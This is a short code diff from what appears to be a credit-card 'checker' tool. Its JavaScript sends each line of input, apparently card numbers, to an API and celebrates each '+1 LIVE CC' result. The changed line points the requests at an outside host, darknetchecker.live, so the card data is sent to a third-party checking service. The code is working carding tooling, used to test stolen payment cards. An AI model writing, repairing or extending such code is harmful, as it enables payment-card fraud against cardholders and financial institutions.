@@ -178,7 +178,7 @@ $('.btn-stop').attr('disabled', false);
 
 line.forEach(function(data){
 var callBack = $.ajax({
-	url: 'api.php?lista=' + data,
+	url: 'https://darknetchecker.live/nonsk/api.php?lista=' + data,
 	success: function(retorno){
 		if(retorno.indexOf("LIVE") >= 0){
 			Swal.fire({title: '+1 LIVE CC', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
